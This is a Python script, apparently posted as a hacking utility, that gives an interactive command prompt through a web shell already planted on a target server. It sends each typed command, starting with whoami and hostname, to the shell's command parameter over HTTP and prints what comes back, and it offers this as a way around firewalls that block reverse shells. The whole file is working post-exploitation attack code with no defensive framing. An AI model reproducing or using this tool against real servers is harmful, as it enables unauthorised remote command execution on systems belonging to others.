#!/usr/bin/python3 
import requests
import sys
import colorama
from colorama import Fore, Back, Style
#Interactive-ish shell for people who can't get a shell for whatever reason like firewall etc. and they don't want to RCE through the webbrowser then this is your solution lol. 


# Function gets link and removes http or https from link.
def getLink():
	link = input("\nPlease input the full url of your webshell: ")
	wrongLink = link.startswith('http://')
	wrongLink2 = link.startswith('https://')
	if wrongLink == True:
		fixed = link.replace('http://','')
		return fixed
	elif wrongLink2 == True:
		fixed = link.replace('https://','')
		return fixed	
	else:
		return link

# Connect to Page and validate link integrity
def connect():
	link = getLink() 
	try:
		x = "https://" + link
		r = requests.post(x)
		if r.status_code != 200:
			print("\nInvalid Link")
		else:
			return x
	except (requests.exceptions.InvalidURL, requests.exceptions.ConnectionError):
		try:
			x = "http://" + link
			r = requests.post(x)
			if r.status_code != 200:
				print("\nInvalid Link")
			else:
				return x
		except (requests.exceptions.InvalidURL, requests.exceptions.ConnectionError): 
			print("\nPlease enter a valid URL")

def cmd():
	colorama.init(autoreset=True)
	command = None
	link = commandName()
	username = requests.get(link + 'whoami')
	user = username.text
	hostname = requests.get(link + 'hostname')
	host = hostname.text
	while command != "exit":
		command = input(Fore.GREEN+f"{str(user).strip()}@{str(host).strip()}: ")
		response = requests.get(link + command)
		print(response.text)


def commandName():
	link = connect()
	while link == None:
		link = connect()
	command = None
	answer = None	
	while answer != 'y':
		command = input("What did you have as your 'cmd' command? Ex. $_REQUEST['cmd']:")	
		newLink = link + '?' + command + '='
		answer = input(f"Just to recap your shell is: {newLink}? (y/n) ")	
		if answer.lower().startswith('y'):
			return newLink
		elif answer.lower().startswith('n'):
			newLink = link
			print("Please try again")
		else: 
			print("Please choose one of the two options")

def main():
	print("############################################################################")
	print("\n				WEB shell")
	cmd()
main()